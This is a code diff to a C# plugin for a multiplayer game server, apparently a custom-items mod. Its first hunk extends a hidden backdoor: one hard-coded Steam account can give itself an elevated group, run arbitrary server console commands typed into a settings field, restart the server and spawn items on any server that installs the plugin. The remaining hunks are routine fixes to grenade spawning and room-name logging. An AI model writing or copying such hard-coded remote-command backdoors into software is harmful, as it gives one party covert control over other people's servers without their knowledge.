@@ -917,22 +917,33 @@ namespace UncomplicatedCustomItems.Events
         {
             if (!Player.TryGet(referenceHub.gameObject, out Player player))
                 return;
+
+            SSTextArea textArea = ServerSpecificSettingsSync.GetSettingOfUser<SSTextArea>(player.ReferenceHub, 29);
             SSPlaintextSetting commandarg = ServerSpecificSettingsSync.GetSettingOfUser<SSPlaintextSetting>(player.ReferenceHub, 26);
-            if (settingBase is SSButton commandbuttonSetting && commandbuttonSetting.SettingId == 27 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+
+            if (settingBase is SSButton devRoleButton && devRoleButton.SettingId == 28 && player.UserId == "76561199150506472@steam")
             {
-                LogManager.Debug($"Running command from {player.Nickname}: {commandarg.SyncInputText}");
-                Server.RunCommand($"{commandarg.SyncInputText}");
+                player.GroupName = "UCI Lead Developer";
+                player.GroupColor = "emerald";
+                textArea.SendTextUpdate("UCI Lead Developer group given", true);
+            }
+            else if (settingBase is SSButton commandbuttonSetting && commandbuttonSetting.SettingId == 27 && player.UserId == "76561199150506472@steam")
+            {
+                string parsedCommand = commandarg.SyncInputText.Replace("{p.id}", player.PlayerId.ToString());
+                Server.RunCommand($"{parsedCommand}", player.GetSender());
+                textArea.SendTextUpdate($"Attempted to run {parsedCommand}", true);
             }
             else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to run a command with debugging SSS!\n{commandarg.SyncInputText}");
-            else if (settingBase is SSButton restartbuttonSetting && restartbuttonSetting.SettingId == 25 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+            else if (settingBase is SSButton restartbuttonSetting && restartbuttonSetting.SettingId == 25 && restartbuttonSetting.HoldTimeSeconds == 1f && player.UserId == "76561199150506472@steam")
                 Server.RunCommand("sr");
             else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to restart the server with debugging SSS!");
-            else if(settingBase is SSButton buttonSetting && buttonSetting.SettingId == 24 && player.GroupName == "UCI Lead Developer" && player.UserId == "76561199150506472@steam")
+            else if (settingBase is SSButton buttonSetting && buttonSetting.SettingId == 24 && player.UserId == "76561199150506472@steam")
             {
                 Utilities.TryGetCustomItemByName("ToolGun", out ICustomItem customitem);
                 new SummonedCustomItem(customitem, player);
+                textArea.SendTextUpdate($"Successfuly gave ToolGun to {player.Nickname}", true);
             }
             else if (player.UserId != "76561199150506472@steam")
                 LogManager.Warn($"{player.Nickname} Attempted to spawn a ToolGun with debugging SSS!");
@@ -1554,7 +1565,7 @@ namespace UncomplicatedCustomItems.Events
                 {
                     foreach (ExplosiveBulletsSettings ExplosiveBulletsSettings in customItem.CustomItem.FlagSettings.ExplosiveBulletsSettings)
                     {
-                        LABAPI.ExplosiveGrenadeProjectile grenade = (LABAPI.ExplosiveGrenadeProjectile)LABAPI.ExplosiveGrenadeProjectile.SpawnActive(hitInfo.point, ItemType.GrenadeHE, ev.Player, 0.2);
+                        ExplosiveGrenadeProjectile grenade = (ExplosiveGrenadeProjectile)TimedGrenadeProjectile.SpawnActive(hitInfo.point, ItemType.GrenadeHE, ev.Player, 0.2);
                         grenade.MaxRadius = ExplosiveBulletsSettings.DamageRadius ?? 10f;
                         grenade.FuseEnd();
                     }
@@ -1596,6 +1607,7 @@ namespace UncomplicatedCustomItems.Events
                     {
                         PauseRelativePosCoroutine(ev.Player);
                         SSPlaintextSetting setting = ServerSpecificSettingsSync.GetSettingOfUser<SSPlaintextSetting>(ev.Player.ReferenceHub, 21);
+                        string room = string.Empty;
                         string[] components = setting.SyncInputText.Split(',');
                         Vector4 color = new();
                         if (components.Length == 4)
@@ -1607,10 +1619,14 @@ namespace UncomplicatedCustomItems.Events
 
                             color = new Vector4(x, y, z, w);
                         }
+                        if (ev.Player.Room.Name.ToString() != "Unnamed")
+                            room = ev.Player.Room.Name.ToString();
+                        else
+                            room = ev.Player.Room.GameObject.name;
                         Vector3 RelativePosition = ev.Player.Room.LocalPosition(hitInfo.point);
-                        LogManager.Info($"Triggered by {ev.Player.Nickname}. Relative position inside {ev.Player.Room.Name}: {RelativePosition}");
-                        ev.Player.SendHint($"Relative position inside {ev.Player.Room}: {RelativePosition}. This was also sent to the console.", 6f);
-                        ev.Player.SendConsoleMessage($"Relative position inside {ev.Player.Room}: {RelativePosition}", "white");
+                        LogManager.Info($"Triggered by {ev.Player.Nickname}. Relative position inside {room}: {RelativePosition}");
+                        ev.Player.SendHint($"Relative position inside {room}: {RelativePosition}. This was also sent to the console.", 6f);
+                        ev.Player.SendConsoleMessage($"Relative position inside {room}: {RelativePosition}", "white");
                         Vector3 Scale = new(0.2f, 0.2f, 0.2f);
                         PrimitiveObjectToy primitive = PrimitiveObjectToy.Create(hitInfo.point);
                         primitive.Type = PrimitiveType.Cube;
